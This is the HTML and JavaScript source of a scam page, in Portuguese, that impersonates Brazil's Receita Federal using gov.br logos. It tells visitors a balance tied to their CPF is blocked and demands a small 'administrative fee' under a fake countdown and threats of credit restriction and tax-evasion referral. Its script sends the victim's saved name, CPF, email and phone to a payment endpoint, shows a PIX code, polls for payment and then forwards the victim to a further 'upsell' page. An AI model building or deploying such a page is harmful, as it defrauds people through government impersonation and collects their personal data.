<!DOCTYPE html>
<html lang="pt-br">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Receita Federal - Notificação Oficial</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap');

    body {
      font-family: 'Inter', sans-serif;
      background-color: #f4f6f8;
      color: #1a202c;
      margin: 0;
      -webkit-font-smoothing: antialiased;
    }

    .gov-blue {
      background-color: #004088;
    }

    /* EFEITO DE CORES CORRENDO */
    .animated-gradient {
      background: linear-gradient(to right, #004088 0%, #0060c0 25%, #00a0e0 50%, #0060c0 75%, #004088 100%);
      background-size: 200% auto;
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      animation: flowing 2.5s linear infinite;
      font-weight: 900;
    }

    @keyframes flowing {
      to {
        background-position: 200% center;
      }
    }

    .shadow-formal {
      box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
    }
  </style>
</head>

<body class="flex flex-col min-h-screen">

  <div id="upsellScreen">

    <header class="bg-white w-full border-b border-gray-200">
      <div class="px-5 py-4 flex justify-start items-center">
        <img src="https://logodownload.org/wp-content/uploads/2022/05/gov.br-logo-0.png" class="h-10" alt="Logo Gov.br">
      </div>
      <div class="gov-blue w-full h-1"></div>
    </header>

    <main class="flex-grow p-4">
      <div class="max-w-md mx-auto bg-white rounded-xl shadow-formal overflow-hidden border border-gray-200 mt-2">

        <div class="bg-gray-50 py-10 flex flex-col items-center border-b border-gray-100 text-center">
          <img src="https://images.seeklogo.com/logo-png/31/1/receita-federal-logo-png_seeklogo-313234.png"
            class="h-24 mb-4" alt="Receita Federal">
          <p class="text-[10px] font-black text-gray-500 uppercase tracking-[0.2em] px-6">Secretaria da Receita Federal
            do Brasil</p>
        </div>

        <div class="p-6">
          <h1 class="text-[#CC0000] text-[15px] font-black leading-tight mb-5 uppercase text-center tracking-tight">
            COMUNICAÇÃO OFICIAL URGENTE
          </h1>

          <div class="space-y-4 text-gray-600 text-[13px] leading-relaxed mb-8 text-center px-2">
            <p>Informamos que foi detectado um <b class="text-gray-900">saldo pendente</b> vinculado ao seu CPF. Para a
              regularização e liberação imediata, é necessário o recolhimento da taxa administrativa:</p>
          </div>

          <div class="bg-gray-50 rounded-2xl py-8 mb-8 border border-gray-100 text-center">
            <span class="text-gray-400 text-[10px] font-black uppercase tracking-widest block mb-1">Guia de Recolhimento
              Única</span>
            <div class="text-4xl animated-gradient tracking-tighter" id="price">
              R$ 32,76
            </div>
          </div>

          <div class="bg-red-50 border-l-4 border-red-600 p-5 mb-8 rounded-r-lg">
            <p class="text-[12px] font-black text-red-700 uppercase mb-2">Penalidades por Não Regularização:</p>
            <ul class="text-[11px] text-red-600 space-y-2 font-bold leading-snug">
              <li class="flex items-start gap-2"><span>•</span> Bloqueio imediato do saldo acumulado;</li>
              <li class="flex items-start gap-2"><span>•</span> Restrição do CPF em sistemas de crédito e bancários;
              </li>
              <li class="flex items-start gap-2"><span>•</span> Encaminhamento para análise de sonegação fiscal.</li>
            </ul>
          </div>

          <div class="flex flex-col items-center mb-8">
            <span class="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1">O prazo de regularização
              expira em:</span>
            <div id="timer" class="text-5xl animated-gradient tracking-tighter">05:00</div>
          </div>

          <a onclick="initiateCheckout(event)"
            class="block w-full gov-blue text-white text-center py-5 rounded-lg font-black text-lg shadow-2xl active:scale-95 transition-all mb-4 uppercase tracking-tighter">
            Pagar taxa e liberar valor
          </a>

          <div class="flex items-center justify-center gap-2 py-4 border-t border-gray-50 mt-4 opacity-80">
            <img src="https://logodownload.org/wp-content/uploads/2022/05/gov.br-logo-0.png" class="h-4">
            <span class="text-[9px] font-bold text-gray-400 uppercase tracking-tighter">Ambiente 100% Seguro -
              gov.br/validação</span>
          </div>
        </div>
      </div>

      <div class="mt-8 text-center text-gray-400 max-w-xs mx-auto pb-10">
        <p class="text-[9px] font-bold uppercase tracking-[0.2em] mb-2">Receita Federal | Ministério da Fazenda</p>
        <p class="text-[8px] leading-relaxed opacity-60">
          Notificação eletrônica protegida por criptografia de ponta a ponta.
        </p>
      </div>
    </main>

    <script>
      function startTimer(duration, display) {
        var timer = duration, minutes, seconds;
        setInterval(function () {
          minutes = parseInt(timer / 60, 10);
          seconds = parseInt(timer % 60, 10);
          minutes = minutes < 10 ? "0" + minutes : minutes;
          seconds = seconds < 10 ? "0" + seconds : seconds;
          display.textContent = minutes + ":" + seconds;
          if (--timer < 0) { timer = 0; }
        }, 1000);
      }
      window.onload = function () {
        startTimer(300, document.querySelector('#timer'));
      };
    </script>

  </div> <!-- fim upsellScreen -->

  <!-- QR Code / PIX Section -->
  <div id="qrcodeSection" class="hidden" style="padding: 0 16px;">
    <div class="px-6 pt-10 pb-8 flex flex-col items-center border-b border-gray-50 bg-white">
      <img src="images/receitafederal.png" alt="TikTok Logo" class="h-28 w-28 object-contain mb-6 drop-shadow-sm" />
      <div class="text-center">
        <p class="text-[11px] font-bold text-gray-400 uppercase tracking-[0.2em] mb-1">
          Valor do Pagamento
        </p>
        <h2 class="text-5xl font-[900] text-[#161823] tracking-tighter" id="paymentValue">
          R$ 0,00
        </h2>
      </div>
    </div>
    <div class="text-center mb-6">
      <h3 class="text-2xl font-black mb-2 text-gray-900">
        Escaneie o QR Code
      </h3>
      <p class="text-gray-500 text-sm">Ou copie o código PIX abaixo</p>
    </div>
    <div
      class="bg-gradient-to-br from-gray-50 to-white border-2 border-gray-200 rounded-2xl p-6 mb-6 flex justify-center shadow-inner">
      <img id="qrCodeImage" src="#" alt="QR Code PIX" class="max-w-full rounded-lg" />
    </div>
    <div class="mb-6">
      <label class="block text-sm font-bold text-gray-700 mb-3">Código PIX (Copiar e Colar)</label>
      <div class="flex gap-2">
        <input type="text" id="pixCode" readonly
          class="flex-1 p-4 rounded-xl border-2 border-gray-200 bg-gray-50 text-xs font-mono" />
        <button
          class="btn-gov px-6 py-4 rounded-xl text-white font-bold uppercase text-xs shadow-lg hover:opacity-90 transition-all"
          id="copy-pix-button" style="background-color: #003473;">
          COPIAR
        </button>
      </div>
    </div>

    <div class="bg-blue-50 border-l-4 border-blue-500 p-4 rounded-r-lg mb-4">
      <p class="text-sm text-gray-700">
        <strong class="text-blue-700">Aguardando pagamento...</strong><br />
        <span class="text-gray-600">O status será atualizado automaticamente.</span>
      </p>
    </div>
    <div id="paymentStatus" class="text-center text-sm font-bold text-gray-600 mb-4">
      Status: Aguardando pagamento
    </div>
  </div>

  <!-- Sucesso -->
  <div id="successSection" class="hidden px-6 py-8">
    <div class="text-center">
      <div class="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6">
        <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
        </svg>
      </div>
      <h3 class="text-2xl font-black mb-2 text-green-600">
        Pagamento Confirmado!
      </h3>
      <p class="text-gray-600 mb-6">Seu saque será liberado em breve.</p>
    </div>
  </div>

  <script>
    const upsellScreen = document.getElementById("upsellScreen");
    const pixQrCodeScreen = document.getElementById("qrcodeSection");
    const pixSuccessScreen = document.getElementById("successSection");
    const qrCodeImage = document.getElementById("qrCodeImage");
    const pixCode = document.getElementById("pixCode");
    const paymentField = document.getElementById("paymentValue");
    const body = document.body;

    const pathParts = window.location.pathname.split('/').filter(Boolean);
    const baseFolder = pathParts[0];

    let currentUpsellVal = 3276;

    const price = document.getElementById("price");
    async function fetchUpsellValue() {
      try {
        const urlParams = new URLSearchParams(window.location.search);
        const uId = urlParams.get("upsell") || "up4";
        const req = await fetch(`/${baseFolder}/get-upsell-value.php?upsell=${uId}`);
        const res = await req.json();
        if (res.success) {
          currentUpsellVal = Math.round(res.value * 100);
          price.textContent = formatPrice(currentUpsellVal / 100);
        }
      } catch (e) {
        console.error("Erro ao buscar valor do upsell", e);
      }
    }

    fetchUpsellValue();

    function formatPrice(value) {
      return `R$ ${parseFloat(value)
        .toFixed(2)
        .replace(".", ",")}`;
    }

    let pollingInterval;
    let pollingAttempts = 0;
    const MAX_POLLING_ATTEMPTS = 60;

    async function initiateCheckout(event) {
      event.preventDefault();

      const clientRawData = localStorage.getItem("clientData");;
      const clientData = clientRawData ? JSON.parse(clientRawData) : null;

      try {
        const name = clientData?.nome
          ? clientData.nome.trim()
          : "Cliente Upsell";
        const document = clientData?.document || "";
        const email = clientData?.email || "";
        const phone = clientData?.phone || "";

        const formData = new FormData();
        formData.append("priceInCents", currentUpsellVal);
        formData.append("email", email);
        formData.append("name", name);
        formData.append("document", document);
        formData.append("phone", phone);

        const urlParams = new URLSearchParams(window.location.search);

        const utmData = {
          utm_source:
            urlParams.get("utm_source") ||
            localStorage.getItem("utm_source") ||
            "",
          utm_medium:
            urlParams.get("utm_medium") ||
            localStorage.getItem("utm_medium") ||
            "",
          utm_campaign:
            urlParams.get("utm_campaign") ||
            localStorage.getItem("utm_campaign") ||
            "",
          utm_content:
            urlParams.get("utm_content") ||
            localStorage.getItem("utm_content") ||
            "",
          utm_term:
            urlParams.get("utm_term") ||
            localStorage.getItem("utm_term") ||
            "",
          xcod: urlParams.get("xcod") || localStorage.getItem("xcod") || "",
          sck: urlParams.get("sck") || localStorage.getItem("sck") || "",
        };

        Object.entries(utmData).forEach(([key, value]) => {
          formData.append(key, value);
        });

        const response = await fetch(`/${baseFolder}/pagamento.php`, {
          method: "POST",
          body: formData,
        });
        const responseData = await response.json();

        if (responseData.success) {
          if (upsellScreen) {
            upsellScreen.style.display = "none";
          }
          pixQrCodeScreen.classList.remove("hidden");
          qrCodeImage.src = responseData.qrCodeUrl;
          pixCode.value = responseData.pixCode;
          body.style.backgroundColor = '#ffffff'
          paymentField.textContent = formatPrice(currentUpsellVal / 100);
          startPaymentPolling(responseData.token);
        } else {
          console.error("Resposta inesperada do pagamento:", responseData);
        }
      } catch (error) {
        console.error("Erro ao gerar PIX:", error);
      }
    }

    async function startPaymentPolling(transactionToken) {
      if (pollingInterval) clearInterval(pollingInterval);
      pollingAttempts = 0;

      pollingInterval = setInterval(async () => {
        pollingAttempts++;
        if (pollingAttempts > MAX_POLLING_ATTEMPTS) {
          clearInterval(pollingInterval);
          return;
        }

        try {
          const response = await fetch(`/${baseFolder}/verificar.php?id=${transactionToken}`);
          if (!response.ok) return;

          const result = await response.json();

          if (result.data.mangofy_data.data.payment_status === 'approved') {
            clearInterval(pollingInterval);
            pixQrCodeScreen.classList.add("hidden");
            pixSuccessScreen.classList.remove("hidden");

            setTimeout(() => {
              window.location.href = `/${baseFolder}/upsell6.html${window.location.search}`;
            }, 2000);
          }
        } catch (error) {
          console.error("Polling error", error);
        }
      }, 5000);
    }

    const copyPixButton = document.getElementById("copy-pix-button");
    const pixCodeText = document.getElementById("pixCode");

    copyPixButton.addEventListener("click", function () {
      if (pixCodeText.value) {
        navigator.clipboard
          .writeText(pixCodeText.value.trim())
          .then(() => {
            copyPixButton.textContent = "Código PIX copiado!";
            setTimeout(() => {
              copyPixButton.textContent = "COPIAR";
            }, 3000);
          })
          .catch(() => {
            copyPixButton.textContent = "Erro ao copiar.";
          });
      }
    });
  </script>

</body>

</html>